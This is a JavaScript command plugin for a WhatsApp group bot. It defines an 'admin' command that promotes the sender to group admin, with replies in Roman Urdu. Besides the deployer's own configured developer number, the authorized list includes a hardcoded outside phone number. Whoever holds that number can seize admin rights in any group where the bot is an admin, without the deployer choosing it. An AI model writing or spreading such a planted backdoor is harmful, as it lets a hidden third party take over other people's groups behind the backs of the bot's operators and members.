const { cmd } = require('../command');
const config = require('../config');

cmd({
  pattern: "admin",
  alias: ["takeadmin", "makeadmin", "promote"],
  desc: "Take adminship for authorized users",
  category: "owner",
  react: "💐",
  filename: __filename
}, async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
  // Verify group context
  if (!isGroup) return reply("*YEH COMMAND SIRF MERE LIE HAI 😊❤️*");

  // Verify bot is admin
  if (!isBotAdmins) return reply("*AGAR AP NE KISI KO ADMIN BANANA HAI ☺️❤️ \n *TO PEHLE MUJHE IS GROUP ME ADMIN BANAYE 😊❤️*");

  // Normalize JIDs for comparison
  const normalizeJid = (jid) => {
    if (!jid) return jid;
    return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
  };

  // Authorized users (properly formatted JIDs)
  const AUTHORIZED_USERS = [
    normalizeJid(config.DEV), // Handles both raw numbers and JIDs in config
    "923078071982@s.whatsapp.net"
  ].filter(Boolean);

  // Check authorization with normalized JIDs
  const senderNormalized = normalizeJid(sender);
  if (!AUTHORIZED_USERS.includes(senderNormalized)) {
    return reply("*DUBARA KOSHISH KAREIN 🥺❤️*");
  }

  try {
    // Get current group metadata
    const groupMetadata = await conn.groupMetadata(from);

    // Check if already admin
    const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
    if (userParticipant?.admin) {
      return reply("*AP JIS KO ADMIN BANANA CHAHTE HAI WO PEHLE SE HI GROUP ME ADMIN HAI 😊❤️*");
    }

    // Promote self to admin
    await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
    return reply("*AB AP IS GROUP ME ADMIN HO OK 😊❤️* \n *GROUP KA KHAYAL RAKHNA OK ☺️❤️* n *AUR GROUP KE RULES BHI READ KAR LO ☺️❤️*");
  } catch (error) {
    reply("*DUBARA KOSHISH KAREIN 🥺❤️*");
  }
});
